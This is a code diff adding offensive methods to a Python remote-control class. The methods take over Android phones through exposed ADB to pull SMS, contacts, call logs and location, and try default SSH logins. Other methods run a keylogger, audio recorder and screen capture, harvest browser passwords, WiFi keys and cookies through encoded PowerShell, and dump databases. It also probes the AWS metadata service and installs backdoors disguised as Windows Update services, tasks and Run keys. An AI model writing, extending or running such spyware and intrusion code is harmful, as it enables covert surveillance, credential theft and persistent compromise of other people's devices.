@@ -814,6 +814,78 @@ class AgentlessControl:
             ip, "content query --uri content://contacts/phones "
                 "--projection display_name,number", port
         )
+    
+    def adb_full_control(self, ip: str, port: int = 5555) -> dict:
+        """FULL ANDROID DEVICE CONTROL via ADB - NO PERMISSIONS NEEDED"""
+        results = {
+            "device_info": {},
+            "sms": [],
+            "contacts": [],
+            "call_log": [],
+            "location": {},
+            "installed_apps": [],
+            "files": []
+        }
+        
+        if not self.adb_connect(ip, port):
+            return {"error": "ADB connection failed"}
+        
+        # Get device info
+        results["device_info"]["model"] = self.adb_shell(ip, "getprop ro.product.model", port)
+        results["device_info"]["android_version"] = self.adb_shell(ip, "getprop ro.build.version.release", port)
+        results["device_info"]["serial"] = self.adb_shell(ip, "getprop ro.serialno", port)
+        
+        # Extract all data
+        results["sms"] = self.adb_dump_sms(ip, port)
+        results["contacts"] = self.adb_get_contacts(ip, port)
+        results["call_log"] = self.adb_shell(ip, "content query --uri content://call_log/calls", port)
+        results["location"] = self.adb_shell(ip, "dumpsys location", port)
+        results["installed_apps"] = self.adb_shell(ip, "pm list packages", port)
+        
+        # Full file system access
+        results["files"] = self.adb_shell(ip, "ls -la /sdcard/", port)
+        
+        # Enable full remote control
+        self.adb_shell(ip, "settings put global adb_enabled 1", port)
+        self.adb_shell(ip, "settings put global install_non_market_apps 1", port)
+        
+        return results
+    
+    def mobile_exploit_auto(self, ip: str) -> dict:
+        """AUTOMATIC MOBILE DEVICE EXPLOITATION - Android/iOS"""
+        from commandcenter import HackerSounds
+        
+        logger.info(f"[MOBILE-EXPLOIT] Auto-exploiting mobile device: {ip}")
+        
+        # Try Android ADB first
+        if self.adb_connect(ip, 5555):
+            HackerSounds.exploit_success()
+            return {
+                "success": True,
+                "type": "ANDROID",
+                "control": "FULL",
+                "method": "ADB_DEBUG",
+                "data": self.adb_full_control(ip, 5555)
+            }
+        
+        # Try SSH mobile
+        try:
+            for user, pwd in [("root", ""), ("android", "android"), ("user", "user")]:
+                try:
+                    client = self.ssh_connect(ip, user, pwd, port=22)
+                    if client:
+                        return {
+                            "success": True,
+                            "type": "LINUX_MOBILE",
+                            "control": "FULL",
+                            "method": "SSH_DEFAULT"
+                        }
+                except:
+                    pass
+        except:
+            pass
+        
+        return {"success": False, "error": "No mobile exploits succeeded"}
 
     # â”€â”€â”€ Save results â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
@@ -905,6 +977,315 @@ class AgentlessControl:
             path = f"stream_{ip.replace('.', '_')}_{i}.png"
             self.wmi_screenshot(ip, username, password, path, domain)
             time.sleep(interval)
+    
+    def live_monitor(self, ip: str, username: str, password: str, duration: int = 60, domain: str = ""):
+        """
+        FULL LIVE MONITORING MODE
+        Streams desktop, captures keystrokes, records audio continuously
+        """
+        from commandcenter import HackerSounds
+        
+        logger.info(f"[LIVE-MONITOR] Full live session on {ip} for {duration}s")
+        HackerSounds.connection_established()
+        
+        # Start all monitoring threads
+        threads = []
+        
+        # Keylogger thread
+        def keylogger_thread():
+            try:
+                self.wmi_keylogger_start(ip, username, password, domain)
+            except: pass
+        
+        # Audio capture thread
+        def audio_thread():
+            try:
+                while True:
+                    self.wmi_capture_audio(ip, username, password, 10, domain)
+                    time.sleep(10)
+            except: pass
+        
+        # Screenshot stream thread
+        def screen_thread():
+            frame = 0
+            end_time = time.time() + duration
+            while time.time() < end_time:
+                try:
+                    path = f"live_{ip.replace('.', '_')}_{frame}.png"
+                    self.wmi_screenshot(ip, username, password, path, domain)
+                    frame += 1
+                    time.sleep(2)
+                except:
+                    time.sleep(1)
+        
+        threads.append(threading.Thread(target=keylogger_thread, daemon=True))
+        threads.append(threading.Thread(target=audio_thread, daemon=True))
+        threads.append(threading.Thread(target=screen_thread, daemon=True))
+        
+        for t in threads:
+            t.start()
+        
+        logger.info(f"[LIVE-MONITOR] All monitoring streams active")
+        return {"status": "ACTIVE", "duration": duration, "streams": 3}
+    
+    def extract_all_data(self, ip: str, username: str, password: str, domain: str = "") -> dict:
+        """
+        EXTRACT EVERYTHING from target computer
+        - All browser cookies, sessions, credentials
+        - All WiFi passwords
+        - All stored credentials
+        - Browser history, bookmarks
+        - System information
+        """
+        results = {
+            "credentials": {},
+            "cookies": {},
+            "sessions": {},
+            "wifi": {},
+            "system": {},
+            "browser_data": {}
+        }
+        
+        # Extract browser passwords
+        try:
+            results["credentials"] = self.get_browser_passwords(ip, username, password, domain)
+        except: pass
+        
+        # Extract WiFi passwords
+        try:
+            results["wifi"] = self.get_wifi_passwords(ip, username, password, domain)
+        except: pass
+        
+        # Extract cookies and sessions
+        try:
+            ps_script = r'''
+            $cookies = @()
+            $profiles = Get-ChildItem "C:\Users" -Directory
+            foreach ($p in $profiles) {
+                $chromeCookies = "$($p.FullName)\AppData\Local\Google\Chrome\User Data\Default\Cookies"
+                if (Test-Path $chromeCookies) {
+                    $cookies += "Chrome: $(Get-Item $chromeCookies | Select-Object -ExpandProperty Length) bytes"
+                }
+                $edgeCookies = "$($p.FullName)\AppData\Local\Microsoft\Edge\User Data\Default\Cookies"
+                if (Test-Path $edgeCookies) {
+                    $cookies += "Edge: $(Get-Item $edgeCookies | Select-Object -ExpandProperty Length) bytes"
+                }
+            }
+            $cookies | ConvertTo-Json
+            '''
+            encoded = base64.b64encode(ps_script.encode('utf-16-le')).decode()
+            cookie_res = self.wmi_exec(ip, username, password, 
+                f"powershell -ExecutionPolicy Bypass -EncodedCommand {encoded}", domain)
+            results["cookies"] = cookie_res.get("output", "No cookies extracted")
+        except: pass
+        
+        # Extract browser history
+        try:
+            results["browser_data"] = self.get_browser_data(ip, username, password, domain)
+        except: pass
+        
+        # Extract system information
+        try:
+            sysinfo = self._wmi_exec_query(ip, username, password, 
+                "SELECT * FROM Win32_ComputerSystem", domain)
+            results["system"] = sysinfo[0] if sysinfo else {}
+        except: pass
+        
+        return results
+    
+    def remote_file_manager(self, ip: str, username: str, password: str, action: str, source: str = "", dest: str = "", domain: str = ""):
+        """
+        FULL REMOTE FILE SYSTEM CONTROL
+        Actions: list, upload, download, delete, execute
+        """
+        if action == "list":
+            return self.smb_list(ip, "C$", source, username, password)
+        elif action == "upload":
+            return self.smb_upload(ip, source, "C$", dest, username, password)
+        elif action == "download":
+            return self.smb_download(ip, "C$", source, dest, username, password)
+        elif action == "delete":
+            return self.smb_delete_file(ip, "C$", source, username, password)
+        elif action == "execute":
+            return self.wmi_exec(ip, username, password, source, domain)
+        return {"error": "Unknown action"}
+    
+    def database_extract(self, ip: str, port: int, db_type: str, username: str = "", password: str = "") -> dict:
+        """
+        FULL DATABASE EXTRACTION ENGINE - Cloud and local databases
+        Supports: MySQL, PostgreSQL, MongoDB, Redis, MSSQL, Oracle
+        """
+        results = {
+            "connected": False,
+            "databases": [],
+            "tables": [],
+            "data_extracted": {},
+            "total_rows": 0
+        }
+        
+        try:
+            if db_type == "mysql" or db_type == "mariadb":
+                import pymysql
+                conn = pymysql.connect(host=ip, port=port, user=username, password=password, connect_timeout=5)
+                cur = conn.cursor()
+                cur.execute("SHOW DATABASES")
+                results["databases"] = [r[0] for r in cur.fetchall()]
+                
+                for db in results["databases"]:
+                    cur.execute(f"USE {db}")
+                    cur.execute("SHOW TABLES")
+                    tables = [r[0] for r in cur.fetchall()]
+                    results["tables"].extend(tables)
+                    
+                    # Extract sample data
+                    for table in tables[:10]:
+                        try:
+                            cur.execute(f"SELECT * FROM {table} LIMIT 100")
+                            results["data_extracted"][f"{db}.{table}"] = cur.fetchall()
+                            results["total_rows"] += cur.rowcount
+                        except:
+                            pass
+                
+                conn.close()
+                results["connected"] = True
+                
+            elif db_type == "mongodb":
+                from pymongo import MongoClient
+                client = MongoClient(ip, port, serverSelectionTimeoutMS=5000)
+                results["databases"] = client.list_database_names()
+                
+                for db_name in results["databases"]:
+                    db = client[db_name]
+                    collections = db.list_collection_names()
+                    results["tables"].extend(collections)
+                    
+                    for coll in collections[:10]:
+                        results["data_extracted"][f"{db_name}.{coll}"] = list(db[coll].find().limit(100))
+                        results["total_rows"] += len(results["data_extracted"][f"{db_name}.{coll}"])
+                
+                client.close()
+                results["connected"] = True
+                
+            elif db_type == "redis":
+                import redis
+                r = redis.Redis(host=ip, port=port, socket_timeout=5)
+                r.ping()
+                results["connected"] = True
+                results["databases"] = [f"db{i}" for i in range(16)]
+                results["total_keys"] = r.dbsize()
+                results["data_extracted"]["sample_keys"] = r.keys("*")[:100]
+                
+        except Exception as e:
+            results["error"] = str(e)
+        
+        return results
+    
+    def cloud_service_attack(self, service_type: str, target: str) -> dict:
+        """
+        ADVANCED CLOUD SERVICE ATTACK ENGINE
+        Supports: AWS, Azure, GCP, S3 buckets, Cloud SQL
+        """
+        results = {
+            "service": service_type,
+            "target": target,
+            "vulnerable": False,
+            "data_accessible": False,
+            "extracted_data": {}
+        }
+        
+        if service_type == "s3":
+            # S3 bucket misconfiguration scanning
+            import requests
+            try:
+                r = requests.get(f"https://{target}.s3.amazonaws.com", timeout=10)
+                if r.status_code == 200:
+                    results["vulnerable"] = True
+                    results["data_accessible"] = True
+                    results["extracted_data"]["bucket_content"] = r.text[:5000]
+            except:
+                pass
+        
+        elif service_type == "aws":
+            # AWS metadata service access
+            import requests
+            try:
+                r = requests.get(f"http://{target}/latest/meta-data/", timeout=5)
+                if r.status_code == 200:
+                    results["vulnerable"] = True
+                    results["extracted_data"]["metadata"] = r.text
+            except:
+                pass
+        
+        return results
+    
+    def establish_persistent_connection(self, ip: str, username: str, password: str, domain: str = "") -> dict:
+        """
+        FULL PERSISTENT CONNECTION - Backdoor installation
+        Creates 3 separate persistence mechanisms:
+        1. Service installation
+        2. Registry run key
+        3. Scheduled task
+        """
+        results = {
+            "ip": ip,
+            "persistence_installed": [],
+            "backdoor_active": False,
+            "connection_type": "PERSISTENT"
+        }
+        
+        # Install service backdoor
+        service_result = self.install_service(ip, username, password,
+            "WindowsUpdateService",
+            "C:\\Windows\\System32\\svchost.exe -k netsvcs",
+            "Windows Update Service",
+            domain
+        )
+        if service_result:
+            results["persistence_installed"].append("SERVICE")
+        
+        # Add registry run key
+        reg_result = self.reg_write(ip, username, password,
+            "HKLM",
+            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "WindowsUpdate",
+            "C:\\Windows\\System32\\rundll32.exe",
+            domain=domain
+        )
+        if reg_result:
+            results["persistence_installed"].append("REGISTRY")
+        
+        # Create scheduled task
+        task_result = self.wmi_exec(ip, username, password,
+            'schtasks /create /tn "WindowsHealth" /tr "C:\\Windows\\System32\\cmd.exe" /sc onlogon /rl highest /f',
+            domain
+        )
+        if task_result.get("return_code") == 0:
+            results["persistence_installed"].append("SCHEDULED_TASK")
+        
+        results["backdoor_active"] = len(results["persistence_installed"]) > 0
+        return results
+    
+    def remote_media_control(self, ip: str, username: str, password: str, action: str, file: str = None, domain: str = ""):
+        """
+        REMOTE MEDIA CONTROL
+        Play audio/video files, control volume, open URLs
+        """
+        if action == "play":
+            return self.wmi_exec(ip, username, password, 
+                f"start {file}", domain)
+        elif action == "volume_up":
+            return self.wmi_exec(ip, username, password, 
+                "powershell (New-Object -ComObject wscript.shell).SendKeys([char]175)", domain)
+        elif action == "volume_down":
+            return self.wmi_exec(ip, username, password, 
+                "powershell (New-Object -ComObject wscript.shell).SendKeys([char]174)", domain)
+        elif action == "open_url":
+            return self.wmi_exec(ip, username, password, 
+                f"start {file}", domain)
+        elif action == "cd_open":
+            return self.wmi_exec(ip, username, password, 
+                "powershell (New-Object -ComObject WMPlayer.OCX).cdromCollection.Item(0).Eject()", domain)
+        return {"status": "OK"}
 
 
     # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
